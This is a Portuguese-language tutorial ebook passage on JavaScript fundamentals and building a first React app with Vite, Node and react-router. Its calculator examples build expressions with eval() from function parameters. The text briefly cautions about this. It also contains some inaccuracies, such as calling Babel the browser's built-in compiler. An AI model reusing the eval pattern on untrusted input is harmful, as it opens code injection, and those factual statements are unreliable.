Para testar os códigos JavaScript de exemplos dessa unidade você pode usar um compilador online 
gratuito 
o 
Programiz 
JavaScript 
Online 
Compiler, 
disponível 
no 
endereço 
https://www.programiz.com/javascript/online-compiler/ 
 

10 
 
 
Basta digitar o código e clicar em RUN para ele executar e mostrar o resultado no Console (Output) 
ao lado. 
 
 
 
1.5.1 Declaração de Variáveis 
A declaração de variáveis no JavaScript usa as palavras-chave "var", "let" ou "const". A palavra-
chave "var" era a forma mais comum de declarar variáveis no JavaScript antes do ECMAScript 6 
(ES6), enquanto "let" e "const" foram introduzidos no ES6 e são preferidos em situações mais 
modernas de desenvolvimento. A diferença principal entre "let" e "const" é que "let" permite que a 
variável seja reatribuída, enquanto "const" declara uma variável com um valor que não pode ser 
alterado.  
var nome = "João"; 
let idade = 30; 
const PI = 3.14; 
 
console.log("Nome: ", nome); 
console.log("Idade: ", idade); 
console.log("Valor de PI: ", PI); 
 
O comando console.log mostra o valor passado no console (tela) do ambiente. 
 
1.5.2 Estruturas Condicionais 
A estrutura básica de uma condicional do JavaScript é: 
If () { <comandos> } 
else {<comandos>  } 
 
Exemplo 
var nome = "João"; 
let idade = 30; 
 
if (idade >= 18) { 
    console.log(nome, "é maior de idade."); 
} else { 

11 
 
 
    console.log(nome, "é menor de idade."); 
} 
 
1.5.3. Laços de Repetição 
Laço for 
O laço for é usado quando o número de iterações é conhecido. Sua estrutura básica é: 
for (let i = 0; i < 5; i++) { 
console.log("Número: " + i); 
} 
 
Laço while 
O laço while é usado quando o número de iterações não é conhecido de antemão e é baseado em 
uma condição.  
 
let i = 0; 
while (i < 5) { 
console.log("Número: " + i); 
i++; 
} 
 
Laço do-while: 
O laço do-while é semelhante ao laço while, mas garante que o bloco de código seja executado 
pelo menos uma vez, mesmo que a condição seja inicialmente falsa.  
 
let i = 0; 
do { 
console.log("Número: " + i); 
i++; 
} while (i < 5); 
 
Escopo de variável 
No JavaScript, quando uma variável é declarada dentro de um bloco utilizando a palavra-chave let 
ou const, ela possui um escopo de bloco. Isso significa que a variável só é acessível dentro desse 
bloco específico e não é visível fora dele. No exemplo fornecido: 
 
flag = true 
var topico = "JavaScript"; 
if (flag) { 
let topico = "React"; 
console.log("Bloco: ", topico);  
} 
console.log("Global: ", topico); 
 
 

12 
 
 
Dentro do bloco do if, uma nova variável TOPICO é declarada usando let e é inicializada com o valor 
"React". Essa variável TOPICO só é válida dentro do bloco do if, portanto, ao fazer console.log 
dentro do bloco, o valor de TOPICO será "React". No entanto, fora do bloco do if, o console.log irá 
se referir à variável TOPICO declarada anteriormente com var, que possui escopo de função ou 
global (dependendo do contexto). Como a variável TOPICO declarada com var está em um escopo 
diferente daquela declarada com let dentro do bloco, elas são consideradas como variáveis 
diferentes, e a atribuição feita dentro do bloco não afeta o valor da variável TOPICO fora dele. 
Assim, o console.log fora do bloco irá imprimir o valor "JavaScript", pois é o valor atribuído 
inicialmente à variável TOPICO. 
 
1.5.4 Template String 
Utilizamos o template literals em JavaScript para criar uma string que contém variáveis ou 
expressões embutidas. Template literals são uma forma mais flexível e legível de criar strings, 
permitindo a interpolação de variáveis ou expressões usando a sintaxe ${} dentro de uma string 
delimitada por crase ( ).  
 
let nome = "José"; 
const mensagem = `Olá ${nome}`; 
console.log(mensagem); 
 
No exemplo, a variável nome é interpolada dentro da string utilizando ${}. Isso significa que o valor 
de nome será inserido na string no lugar da expressão ${nome}. Por exemplo, se o valor de nome 
for "João", a variável mensagem receberá a string "Olá João". O uso de template literals simplifica 
a concatenação de strings e torna o código mais legível e fácil de manter, especialmente ao lidar 
com strings longas ou com várias variáveis. Além disso, ao declarar a variável com const, garantimos 
que o valor de mensagem não será reatribuído, ou seja, ele permanecerá constante após a sua 
inicialização. 
 
Declaração de funções 
A declaração de função ou definição de função começa com a palavra-chave function, seguida pelo 
nome da função. 
 
let nome = "José"; 
 
function saudacao() {  
    console.log(`Olá ${nome}`); 
} 

13 
 
 
 
Para invocá-la basta chamar o seu nome. 
saudacao(); 
 
1.5.5 PASSAGEM DE PARÂMETROS 
Podemos passar parâmetros e deixar a função mais genérica. 
 
function saudacao(nome) {  
    console.log(`Olá ${nome}`); 
} 
saudacao("José"); 
saudacao("João"); 
 
Um outro exemplo 
 
function calcular(x1, x2, operador){ 
return eval(`${x1} ${operador} ${x2}`); 
} 
let resultado = calcular(3,2,"+"); 
console.log(resultado); 
 
O código apresentado define uma função chamada calcular que recebe três parâmetros: x1, x2 e 
operador. A função utiliza o método eval() para avaliar uma string contendo uma expressão 
matemática construída a partir dos parâmetros fornecidos. Dentro da string, o valor de x1, o 
operador e o valor de x2 são concatenados para formar a expressão a ser avaliada. 
 
A função calculará 3 + 2 e retornará o resultado, que é 5. Esse resultado é atribuído à variável 
resultado. 
Este código demonstra como passar parâmetros para uma função em JavaScript e como a função 
pode usar esses parâmetros para realizar operações e retornar um resultado específico. No entanto, 
é importante notar que o uso de eval() deve ser feito com cautela, pois pode representar riscos de 
segurança se usado com entrada não confiável. 
Um exemplo utilizando vetores 
 
function calcular(valores, operador){ 
return eval(`${valores[0]} ${ operador} ${valores[1]}`); 
} 
 
const valores = [3,2]; 
let resultado = calcular(valores,"+"); 
console.log(resultado); 
 
1.5.6 VALORES DEFAULT 

14 
 
 
Os valores padrão (ou default) de uma função em JavaScript são valores que são atribuídos aos 
parâmetros da função caso não sejam fornecidos na chamada da função. Isso significa que você 
pode definir valores padrão para os parâmetros da função, garantindo que a função possa ser 
chamada com menos argumentos do que o número total de parâmetros definidos na função, sem 
causar erros. Os valores padrão são especificados na definição da função, utilizando a sintaxe de 
atribuição de parâmetros padrão: 
 
function saudacao(nome = "Maria") {  
    console.log(`Olá ${nome}`); 
} 
saudacao("José"); 
saudacao("João"); 
saudacao(); 
 
1.5.7 FUNÇÃO ANÔNIMA  
Uma função anônima é uma função que não possui um nome identificador associado a ela. Em vez 
de ser definida com um nome específico, ela é criada como uma expressão de função e geralmente 
é usada em contextos onde é necessária uma função temporária ou local. 
 
let soma = function(x, y) { 
return x + y; 
}; 
console.log(soma(2,3)) 
 
Neste código, a função anônima não tem nome entre a palavra-chave function e os parênteses (). 
Como precisamos chamar a função em algum momento, ela foi atribuída a uma variável.   
 
• let soma =: Declaração de uma variável chamada soma usando a palavra-chave let. 
• function(x, y) { ... }: Esta é a definição da função anônima. A função recebe dois parâmetros 
x e y. 
• { return x + y; }: Dentro do corpo da função, temos uma única instrução que retorna a soma 
dos parâmetros x e y. 
Quando desejamos criar uma função e executá-la imediatamente após a declaração, pode usar a 
função anônima auto invocada (IIFE).  
 
let resultado = (function(x1, x2, operador){ 
    return eval(`${x1} ${operador} ${x2}`); 
})(3,2,"+"); 
 

15 
 
 
console.log(resultado)  
 
(function(x1, x2, operador) { ... }): Esta é a função anônima auto invocada. Ela recebe três 
parâmetros: x1, x2 e operador. A expressão (3, 2, "+") após a definição da função são passados 
como argumentos para a função anônima. Isso significa que a expressão 3 + 2 será calculada 
imediatamente. 
 
1.5.8 ARROW FUNCTIONS 
As arrow functions são uma forma mais concisa de escrever funções anônimas em JavaScript. Elas 
fornecem uma sintaxe mais compacta e uma maneira mais simples de definir funções, 
especialmente para funções de retorno de uma única expressão 
 
A sintaxe básica de uma arrow function é a seguinte: 
 
const minhaFuncao = (parametro1, parametro2) => { 
    // corpo da função 
}; 
• const (ou let): A declaração de variável que define a função. Você pode usar const ou let 
dependendo da necessidade de retribuição do valor da função. 
• minhaFuncao: O nome da função. Ele é opcional e pode ser omitido se você estiver 
atribuindo a função a uma variável ou usando-a como uma expressão. 
• (parametro1, parametro2): Os parâmetros da função, entre parênteses. Pode ser zero 
ou mais parâmetros. 
• =>: A seta (ou "arrow"), que substitui a palavra-chave function em uma função tradicional. 
• {}: O corpo da função, onde você coloca o código que a função executará. 
 
Exemplos: 
 
const dobrar = (numero) => numero * 2; 
let valores = (x, y) => { return x + y; }; 
 
console.log(dobrar(2)) 
console.log(valores(2,3)) 

16 
 
 
 
 
INTRODUÇÃO AO REACT 
 
Ao final dos estudos, você deverá ser capaz de: apresentar os pilares fundamentais do React, 
bem como discorrer sobre o Document Object Model (DOM) e explicar como o React interage com 
ele para atualizar eficientemente a interface do usuário em resposta a mudanças no estado do 
aplicativo. Além de apresentar uma sequência de passos para instalar o ambiente de 
desenvolvimento necessário para executar as atividades. 
 
2.1. Instalação do Ambiente 
Para desenvolver Front-ends, ou até Back-ends, é preciso instalar um ambiente de desenvolvimento 
para o conjunto de tecnologia que pretendemos usar. Não existe uma forma única. Se acostume a 
testar tecnologias, ambiente, configurações diferentes. Depois escolha a que melhor se adapta ao 
propósito da sua aplicação. 
 
Para esse curso precisamos escolher o conjunto de frameworks e bibliotecas que nos auxiliarão no 
desenvolvimento. Por questões didáticas escolhemos: ReactJS, Vite e Node. 
Sobre o ReactJS já falamos um pouco. Agora falaremos sobre o Vite, vamos deixar o Node para 
depois. Lembrando, isso foi apenas uma escolha. 
 
Primeiro, para executar qualquer linguagem precisamos de um compilador. Em React programamos 
em JavaScript, React é apenas o nome da biblioteca. JavaScript é compilado no próprio navegador, 
compilador padrão do JavaScritpt amplamente usado nos navegadores é o Babel. Sua função 
principal é converter o código escrito em JavaScript moderno (ES6+, TypeScript, etc.) em uma 
versão compatível com navegadores.  
 
Uma aplicação em JavaScript pode ter vários arquivos ou módulos que se referenciam (um chama 
o outro). Para que o browser entenda isso é necessário usarmos o Webpack (Bundle) que é um 
empacotador de módulos para aplicações JavaScript. Sua principal função é organizar e gerenciar 
as dependências do projeto, além de empacotar o código em bundles otimizados para produção. O 
Webpack permite que os desenvolvedores dividam o código em módulos, definam dependências 
entre esses módulos e, em seguida, empacotem tudo em um ou mais pacotes de saída (bundles).  
UNIDADE 2 

17 
 
 
O Vite é uma ferramenta de desenvolvimento de Front-end que vai facilitar nossa vida quanto o uso 
do compilador e do empacotador. Desenvolvido pela equipe por trás do Vue.js, Vite utiliza uma 
arquitetura de desenvolvimento baseada em ESM (ECMAScript Modules) para oferecer tempos de 
compilação e recarga instantâneos. Em vez de empacotar todo o código do projeto, como o 
Webpack faz, o Vite fornece um servidor de desenvolvimento que entrega os módulos ES 
diretamente ao navegador, sem a necessidade de processamento adicional. Além disso, Vite é 
agnóstico em relação ao framework, o que significa que pode ser utilizado com qualquer framework 
JavaScript, como React, Vue.js, Svelte, entre outros. 
 
Enquanto Babel e Webpack são ferramentas amplamente estabelecidas no ecossistema de 
desenvolvimento web, Vite é uma alternativa mais recente que visa fornecer uma experiência de 
desenvolvimento mais rápida e eficiente. Enquanto Babel se concentra na compilação de código 
JavaScript para garantir a compatibilidade com navegadores antigos, Webpack trata do 
empacotamento e otimização de recursos para produção. Por outro lado, Vite adota uma abordagem 
diferente, aproveitando a capacidade dos navegadores modernos de importar módulos ES 
diretamente, sem a necessidade de empacotamento adicional. Isso resulta em tempos de 
compilação e recarga muito mais rápidos durante o desenvolvimento. 
 
2.1.1 Instalação do Visual Studio Code (VSCode) 
É importante salientar que todo o processo de instalação do ambiente descrito nesse Ebook é para 
Windows. No material complementar você encontra referências para outros sistemas operacionais. 
Vamos primeiro instalar o programa Visual Studio Code (VSCode). O VSCode é um editor de código 
desenvolvido pela Microsoft. Ele é conhecido por sua interface intuitiva, extensibilidade e suporte a 
uma ampla variedade de linguagens de programação. Para instalar o VSCode acesse o site oficial 
do Visual Studio Code em https://code.visualstudio.com/. Na página inicial selecione o botão de 
download do seu sistema operacional (Windows, macOS ou Linux). 
 

18 
 
 
 
 
Após o download ser concluído vá para a pasta onde baixou o arquivo e execute o instalador. Siga 
as instruções na tela para concluir a instalação. Normalmente, isso envolve aceitar os termos de 
uso, escolher o local de instalação e selecionar as opções de inicialização rápida, se disponíveis. 
Após a instalação ser concluída, você pode encontrar o Visual Studio Code em seu menu de 
aplicativos ou área de trabalho, dependendo das configurações do seu sistema operacional. 
 
• ColorHighlight: Esta extensão destaca automaticamente as cores CSS em seu código, 
permitindo uma visualização rápida e fácil das cores utilizadas. 
• JSX HTML <tags/>: Esta extensão melhora a formatação e a sintaxe do JSX, fornecendo 
realces de sintaxe aprimorados para elementos JSX que contêm HTML. 
• IntelliCode: O IntelliCode é uma extensão que utiliza aprendizado de máquina para oferecer 
sugestões de código inteligentes enquanto você digita, economizando tempo e melhorando 
a produtividade. 
Para instalar, abra o Visual Studio Code, vá para a aba de extensões (clique no ícone de quadrado 
com quatro quadrados menores à esquerda) e pesquise o nome da extensão. Clique em "Instalar". 
 

19 
 
 
 
 
2.1.2 INSTALAÇÃO DO Node.js 
Como vamos programar em JavaScript ou TypeScritp é preciso instalar um ambiente que execute 
o código gerado. Instalar o Node.js é fundamental ao desenvolver aplicações com ReactJS, pois o 
Node.js fornece um ambiente de execução JavaScript fora do navegador, o que é essencial para o 
desenvolvimento e execução de aplicações React no ambiente de servidor. O Node.js, muitas vezes 
referido como Node.  
 
O ReactJS é uma biblioteca JavaScript que geralmente é executada em um navegador da web. No 
entanto, durante o desenvolvimento, é crucial ter um ambiente de execução JavaScript no servidor 
para compilar, construir e executar a aplicação. O Node.js fornece esse ambiente, permitindo que 
você execute JavaScript no servidor e interaja com o sistema de arquivos, execute tarefas de 
compilação e inicie um servidor de desenvolvimento local. 
 
Primeiro vamos verificar se o Node não está instalado na máquina. Abra o Terminal e digite o 
comando que mostrará a versão do Node instalado ou uma mensagem casos não tenha Node na 
sua máquina. 
node -v 

20 
 
 
 
 
Para instalar o Node.js, siga os passos abaixo: 
 
Acesse o site oficial do Node.js em https://nodejs.org/. Na página inicial, você encontrará o botão 
de download. O site detectará automaticamente o sistema operacional em que você está e oferecerá 
a versão adequada do Node.js para download. Escolha a opção Recommended For Most Users. 
Como as versões são sempre atualizadas por ser que o númerp da versão no momento que for 
executar seja outro. 
 
 
 
Clique no botão de download para obter o instalador correspondente ao seu sistema operacional 
(Windows, macOS ou Linux). Após o download ser concluído, execute o instalador. 
 
Siga as instruções na tela para concluir a instalação. Normalmente, isso envolve aceitar os termos 
de uso, escolher o local de instalação e selecionar as opções de instalação adicionais, se disponíveis. 

21 
 
 
 
 
Pode acontecer de durante a instalação o PowerShell abra e peça para confirmar algumas 
instalações através do ENTER. 
 
 
 
Após a instalação ser concluída, você pode verificar se o Node.js foi instalado corretamente abrindo 
um terminal ou prompt de comando e digitando o seguinte comando: 
node -v 

22 
 
 
 
Se aparecer a versão significa que o Node foi instalado com sucesso. 
 
2.1.3 CRIANDO UM PROJETO COM O Vite 
Crie uma pasta no seu computador para ser o repositório do seu projeto. Abra o Prompt de Comando 
do Windows (cmd) e vá para essa pasta. Por exemplo: 
 
cd  Documents\Projetos 
 
Coloque o endereço de onde você criou a pasta. Depois digite: 
 
npm create vite@latest 
 
 
O NPM ou Node Package Manager é o gerenciado de pacotes do Node.js, é como se fosse uma 
ferramenta de instalação. 

23 
 
 
 
O comando "npm create vite@latest" é usado para criar um novo projeto com Vite. Ao executar 
esse comando, o npm irá instalar a versão mais recente do Vite e usá-la para gerar a estrutura 
inicial do projeto.  
 
Seguir os passos selecionando Y para proceder, dando um nome ao projeto (sugestão projteste, 
para ficar como os dos exemplos desse ebook), escolhendo React como framework e depois a 
linguagem JavaScript. 
 
 
 
 
Depois do processo completado, abra o Visual Studio Code em escolha a opção File => Open Folder, 
escolha a pasta que com o nome do projeto que escolheu no passo anterior. 
 
Caso aparecer essa janela abaixo apenas selecione, Yes, I trust the authors (Sim, eu confio nos 

24 
 
 
autores) 
 
 
Agora é preciso instalar as dependências no projeto, todas as bibliotecas necessárias para ele 
executar. Abra o terminal do próprio VSCode, escolha na barra de menu Terminal => New Terminal. 
Agora digite: 
npm install 
 
Vamos agora executar o template da aplicação criada para ver se a criação do projeto deu certo: 
npm run dev 
 
O comando "npm run dev" é usado para executar o script de desenvolvimento definido no arquivo 
"package.json" de um projeto Node.js. Geralmente, esse script é configurado para iniciar o servidor 
de desenvolvimento da aplicação, permitindo que você visualize e teste seu projeto localmente 
durante o desenvolvimento. Na imagem o endereço http//localhost:5173 é onde o script será 
executado.  

25 
 
 
 
 
Abra o endereço no seu browser. Se aparecer a tela significa que a criação e execução do projeto 
foi bem sucedida.  
 
Dica: Vamos usar como navegado sempre o Chrome. 
A seguinte estrutura de pastas é criada: 

26 
 
 
 
2.2 Pilares do React 
Quando criamos uma página (view) podemos dividi-la em partes como: cabeçalho, rodapé, menu, 
corpo etc. Essas partes podem ser definidas como “componentes” (User Interface), que são partes 
independentes e reutilizáveis. Podemos, por exemplo, reutilizar o cabeçalho em várias páginas 
diferentes.  
 
Figura: Estruturação de uma página em componentes. 
 
Claro que é possível criar uma página como um único grande componente, mas isso não é 
aconselhável. O ideal é que uma página web seja dividida em componentes conforme a 
funcionalidade de cada um. Os componentes costumar estar relacionados a funcionalidade de uma 

27 
 
 
página, por exemplo, um calendário, uma galeria de fotos, uma área de envio de mensagens. Todos 
esses são exemplos de componentes que poderiam aparecer em diversas páginas de um site. Assim, 
seria interessante fazer esses componentes apenas uma vez e reutilizá-lo em diversos locais 
diferentes.  
 
O papel principal do React é renderizar a página através da manipulação de seus componentes UI 
(User Interface). Um componente React é criado para ser encapsulado, reutilizável e combinável. 
Encapsulado porque cada componente possui a sua função própria, sendo que os outros 
componentes só precisam conhecer a sua interface. Reutilizável pois podem ser utilizados em 
diversas partes da aplicação sem precisar de modificação. E por fim combináveis, pois podemos 
compor um componente maior a partir de outros componentes que trabalharão em conjunto. 
 
Os componentes React possuem um ciclo de vida composto de métodos bem definidos como 
montagem, atualização, desmontagem etc., que podem ser acessados em momentos distintos. É 
essa característica que permite ao React criar uma interface que não precisa ser recarrega inteira, 
toda vez que um componente mudar.  
 
2.3 Document Object Model (DOM) 
Document Object Model (DOM) é a representação de um documento (HTML e XML) carregado pelo 
navegador. Ele é composto por uma hierarquia de objetos que reflete a estrutura da página. É via 
DOM que podemos acessar, armazenar e manipular diferentes partes de um documento. 
 
Vejamos um exemplo de uma página HTML: 
 
<!DOCTYPE html> 
<html> 
   <head> 
 
<title> Título da Página </title> 
   </head> 
   <body> 
 
<div> 
 
   <h1> Texto </h1> 
 
   <p> Texto </p> 
 
</div> 
   </body> 
</html> 
 
Ela pode ser representada pela seguinte estrutura DOM: 

28 
 
 
 
 
As propriedades, métodos e eventos são organizados em objetos que os desenvolvedores podem 
manipular através de comandos como, por exemplo: 
• documet.getElementsByTagName(name); 
• document.getElementsByID (id); 
• document. createElement (name).  
O principal objeto é o document que representa o próprio documento, ele está no topo da 
hierarquia seguido pelo elemento root <html>.  
 
A manipulação direta do DOM não é algo tão simples. Se um programador que modificar um 
elemento HTML, por exemplo, mudar a cor do <p> ele deve acessar seguindo a hierarquia do DOM 
usando, por exemplo, um dos comados getElements... para chegar no elemento desejado.  
Sem contar que o acesso ao DOM leva um tempo, e cada alteração obriga o navegador a renderizar 
novamente a parte da tela afetada e isso traz problemas de performance. 
 
Para resolver esse problema, bibliotecas como o React usa o Virtual DOM (VDOM). Ele é uma 
representação do DOM mantida em memória. As alterações são então sempre feitas em memória, 
para depois ser atualizado o DOM. Nessa abordagem o DOM é acessado menos vezes. 
 
O React não altera o DOM diretamente, mas sim o DOM Virtual. Os componentes UI que são criados 
e manipulados pelo React ficam entre o DOM e a camada lógica. Essa camada intermediária é uma 
cópia do DOM e é chamada de DOM Virtual, sendo seu acesso mais rápido do que seria via API do 
DOM. Dessa forma, o React só precisa alterar no DOM aqueles componentes que foram modificados 

29 
 
 
e apenas quando todas as modificações forem finalizadas. 
 
Fonte: https://www.geeksforgeeks.org/reactjs-virtual-dom/ 
 
 
 

30 
 
 
 
 
COMPONENTES NO REACT 
 
Ao final dos estudos, você deverá ser capaz de: entender duas abordagens fundamentais para 
criar componentes em React: class components e function components. Desvendar as nuances de 
cada tipo de componente, entender suas características distintas e descobrir como aproveitar ao 
máximo suas funcionalidades. 
 
3.1 Conceito de Componentes 
As interfaces web são criadas a partir de um conjunto de componentes. Quando criamos uma página 
ela pode ser dividida em uma estrutura hierárquica de componentes que podem representar desde 
um simples botão até estruturas maiores como cabeçalho, rodapé, navegação e tudo mais que 
possa, inclusive, ser reutilizado.   
 
A figura abaixo é um exemplo de divisão de uma página em componentes. Vemos os componentes: 
cabeçalho, menu, corpo, artigo, carrossel e rodapé. Para montar essa página usando o React 
poderíamos criar uma estrutura hierarquizada de componentes. 
 
 
Figura: Estruturação de uma página em componentes. 
Mas, os componentes do React podem ser mais poderosos do que isso e cuidar do roteamento, ou 
da formatação dos dados, por exemplo. Os componentes aceitam dados de entrada e retornam os 
UNIDADE 3 

31 
 
 
elementos React que apareceram na tela. 
 
Uma das características principais dos componentes é a garantia da sua consistência. Um 
componente pode receber dados externos (props) e manter seu estado interno (states). A partir 
dos dados e estado é capaz de atualizar uma UI. O React monitora as mudanças que ocorrem em 
um componente e sempre que a entrada para um componente é alterada, ele é renderizado 
novamente, garantindo assim a atualização da interface. 
 
Os componentes React podem construídos como funções (function components) ou classes (class 
components) JavaScript.  
 
3.1.1 Componentes de Função (Function Component)  
Os function components são criados usando funções do JavaScript. Eles são utilizados quando não 
se pretende gerenciar o estado do componente, sendo mais importante a apresentação dos dados, 
por isso são identificados também como componentes funcionais sem estado. 
 
Possuem a seguinte aparência: 
 
function MyButton() { 
  return ( 
    <button>I'm a button</button> 
  ); 
} 
 
Uma vez criado um componente, esse representa um botão, ele pode ser utilizado em outras partes 
do site simplesmente declarando seu nome como se fosse uma tag HTML:  
 
export default function MyApp() { 
  return ( 
    <div> 
      <h1>Welcome to my app</h1> 
      <MyButton /> 
    </div> 
  ); 
} 
 
MyApp seria uma página que possui uma tag <H1> e também um botão, mas não um botão normal 
do HTML, mas sim o componente <MyButton /> que foi definido como um componente React. 
Essa seria a saída no Browser: 
 

32 
 
 
 
 
Observação: nesse ebook utilizamos alguns códigos do site oficial do React. Para saber se a fonte 
é esse site, todos os códigos em inglês virão do site: https://react.dev/learn, como é o caso do 
exemplo acima. 
 
VAMOS PRATICAR: 
Vamos praticar e criar nosso primeiro projeto React. 
 
Espero que você já tenha instalado todos os softwares necessários. Caso não tenha ainda volte à 
unidade 2 e siga os passos de instalação e depois execute todos os procedimentos da seção 2.3.1 
para criar um projeto React+Vite. 
 
Não esqueça depois de abrir o VSCode executar o: 
 
npm install 
 
Uma vez que o projeto esteja criado e rodando, vamos agora remover os arquivos desnecessários 
• Remova alguns dos arquivos que estão na pasta src que não usaremos inicialmente:  
o App.css 
o Index.css 
• Remova o arquivo react.svg da pasta assets. 
Abra o arquivo main.jsx e retire a linha do import './index.css'.  E também altera import 
App from './App.jsx' para import {App} from './App.jsx' colocando as  {}. O 
código ficará assim: 
 
import React from 'react' 
import ReactDOM from 'react-dom/client' 
import {App} from './App.jsx' 
 
ReactDOM.createRoot(document.getElementById('root')).render( 
  <React.StrictMode> 
    <App /> 
  </React.StrictMode>, 
) 
 

33 
 
 
 
Abra o Arquivo index.html e mude a tag <title>Vite + React</title>, para <title>Meu 
Primeiro Projeto React </title> 
 
 
Abra o arquivo App.jsx e retire as linhas com os comandos 
 
import reactLogo from './assets/react.svg' 
import viteLogo from '/vite.svg' 
import './App.css' 
 
 
Apague também todo o código que está dentro do RETURN e trocar por uma mensagem “Olá, 
Mundo!”. No final o arquivo App,jsx deve  ficar EXATAMENTE assim: 
 
export function App() { 
  return ( 
    <h1>Olá, mundo!</h1> 
  ) 
} 
 
 
Mais uma vez, observe que foi retirado a parte export default App e também foi modificado 
o cabeçalho da função export function App(). O que foi feito foi a retirada do export default 
e colocado no function. 
 
Visualize no browser como ficou agora a página. 
 
 
(ASSISTA AS VIDEO-AULAS PARA ENTENDER O PROCEDIMENTO COMPLETO). 
 
Em um projeto React os arquivos Index.html, Main.jsx e App.jsx estão interconectados para fornecer 
a estrutura básica e funcionalidade de uma aplicação web. 
  
O index.html é o ponto de entrada principal da sua aplicação web. 
 

34 
 
 
Ele contém a estrutura HTML básica, como tags <html>, <head> e <body>. 
 
O Index.html é o arquivo que será carregado inicialmente pelo servidor e que contém um elemento 
no qual a aplicação React será montada. 
 
 <body> 
    <div id="root"></div> 
    <script type="module" src="/src/main.jsx"></script> 
  </body> 
 
 
Perceba que dentro da tag <body> é informado que o arquivo a ser carregado é o Main.jsx, e 
existe uma <div> vazia de id=root  
 
 
<div id="root"></div>  
 
 
Será dentro dessa tag que a página que você construir com os componentes será renderizado. 
O Main.jsx é o arquivo de entrada JavaScript para sua aplicação. Ele é responsável por inicializar a 
aplicação React e montá-la no DOM. Além disso, no Main.jsx, você pode configurar outras 
bibliotecas, como roteamento (por exemplo, React Router), e quaisquer outras configurações 
globais necessárias para sua aplicação. 
 
A tag <App /> no Main.jsx, importa o componente App, definido no arquivo App.jsx, e o 
renderiza dentro da div com o id root no Index.html. 
 
O App.jsx é o componente raiz da sua aplicação React, que contém a estrutura básica da interface 
do usuário da sua aplicação e pode ser composto por outros componentes menores. Dentro do 
App.jsx, você pode definir o layout principal da sua aplicação, lidar com o roteamento, e outros 
aspectos que são comuns a toda a aplicação. 
 
O App.jsx tem apenas uma função Javascript que retorna HTML. Isso é um componente. 
function App() { 
  return ( 
    <h1>Olá, mundo!</h1> 
  ) 
} 
 
Todos os componentes do React devem ter a extensão jsx que é a indicação de um arquivo 
JavaScript que contêm HTML. 
 

35 
 
 
ESTUDO DE CASO: 
Vamos começar a criar uma aplicação web que norteará todo o restante dessa disciplina. Criaremos 
o Front-End de um sistema para cadastrar contatos. Teremos uma Home com uma parte com perfil 
e foto e na parte principal da página dois links para um para a tela de cadastro e outro para consulta. 
 
 
 
A tela de consulta mostra a lista de contatos 
 
A tela de cadastro para cadastrar os dados, mas como estamos fazendo apenas o Front não 
registraremos os dados em banco de dados, apenas o recolhemos e mostraremos em um alert. 
 

36 
 
 
 
(ASSISTA AS VIDEO-AULAS PARA ENTENDER O PROCEDIMENTO DE CONSTRUÇÃO DO 
ESTUDO DE CASO, EM APOIO A DESCRIÇÃO DO EBOOK) 
 
 
Crie um novo projeto React, conforme procedimento anterior. Dê o nome de contatos. 
Abra o VsCode e execute no Terminal na sequência: 
 
npm install 
 
npm install react-router-dom axios 
 
npm run dev 
 
 
 Apague os arquivos desnecessários. Não esqueça de mudar o title do arquivo Index.html 
 
<title>Sistema de Cadastro</title> 
 
 
Agora crie uma pasta chamada components e dentro dela quatro arquivos: 
 
• Cadastro.jsx 
• Consulta.jsx 
• Contato.jsx 
• Home.jsx 
 
O código de cada um será: 
 
 
export function Cadastro() { 
    return <h2>Cadastro</h2>; 

37 
 
 
}  
 
 
 
export function Consulta() { 
    return ( 
    <div> 
        <h2>Lista de Contatos</h2> 
    </div> 
    ); 
}  
 
 
 
export function Contato() { 
    return ( 
    <div> 
        <div> 
            <p>Nome: Joelma Ferreira </p> 
            <p>Endereço:Rua 17, 896 </p> 
            <p>Telefone: 99856587 </p> 
            <br/> 
            <p>Nome: Diogo Almeida </p> 
            <p>Endereço: Rua das Flores, 12 </p> 
            <p>Telefone: 89545588 </p> 
            <br/> 
            <p>Nome: Pablo Picasso </p> 
            <p>Endereço:Avenida das Nações </p> 
            <p>Telefone: 96578541 </p> 
            <br/> 
        </div> 
    </div> 
    ); 
}  
 
 
 
export function Home() { 
    return ( 
        <div> 
        <h2>Sistema de Contatos</h2> 
      </div> 
    ) 
} 
 
O que precisamos fazer agora é colocar em Home um link para cada uma das páginas Cadastro de 
Consulta. Mas para navegar entre as páginas de uma aplicação React precisaremos criar rotas, onde 
cada rota vai representar uma tela, para isso temos que criar uma rota, usando o react-router-dom.   
O React em si não possui um sistema de roteamento integrado, mas é comumente usado em 
conjunto com bibliotecas de roteamento populares, como React Router, para adicionar 
funcionalidades de roteamento à aplicação. 

38 
 
 
 
Nós já importamos o React Router usando: 
  
npm install react-router-dom 
Agora no arquivo Home.jsx crie dois links: 
 
import { Link } from "react-router-dom"; 
 
export function Home() { 
    return ( 
        <div> 
        <h2>Sistema de Contatos</h2> 
        <p><Link to="cadastro">Cadastro</Link></p> 
        <p><Link to="consulta">Consulta</Link></p> 
      </div> 
    ) 
} 
 
O Link é usado para criar links entre diferentes rotas em uma aplicação React. to="consulta" 
ou to=”cadastro” são atributos do componente Link que especifica o destino do link, ou seja, 
para qual página deve redirecionar quando clicado.  A definição de qual componente/página está 
associado a cada um desses nome precisa ser definido no Route previamente. 
 
Vamos fazer essa definição no Arquivo App.jsx. Ele completo ficará da seguinte forma: 
import { Routes, Route } from "react-router-dom" 
 
import {Home} from './components/Home'; 
import {Cadastro} from './components/Cadastro'; 
import {Consulta} from './components/Consulta'; 
 
export function App() { 
  return (  
  <div> 
    
      <Routes> 
        <Route path="/" element={ <Home/> } /> 
        <Route path="cadastro" element={ <Cadastro/> } /> 
        <Route path="consulta" element={ <Consulta/> } /> 
      </Routes> 
  </div> 
  ) 
} 
 
Vamos analisar por partes: 
      <Routes> 
        <Route path="/" element={ <Home/> } /> 
        <Route path="cadastro" element={ <Cadastro/> } /> 
        <Route path="consulta" element={ <Consulta/> } /> 

39 
 
 
      </Routes> 
 
• <Routes>: Este é um componente fornecido pelo pacote react-router-dom que envolve 
todas as rotas da sua aplicação. Ele é usado para definir o contexto de roteamento da 
aplicação. 
• <Route>: Este é um componente que define uma rota específica na sua aplicação. Ele 
mapeia um determinado caminho (path) da URL para um componente que deve ser 
renderizado quando esse caminho é acessado. 
• path=: Este é o atributo path do componente <Route>, que especifica o caminho da 
URL que esta rota deve corresponder.  O "/" diz respeito a url home, e path="cadastro" e 
path="consulta":  
• element={ <Home/>}, element={ <Cadastro/> } e element={ <Consulta/> }: 
Estes são os atributos element que especificam os componentes a serem renderizados 
quando os caminhos correspondentes forem acessados. 
Para terminar de configurar o roteamento acrescente no Main.jsx o import para o BrowserRouter, 
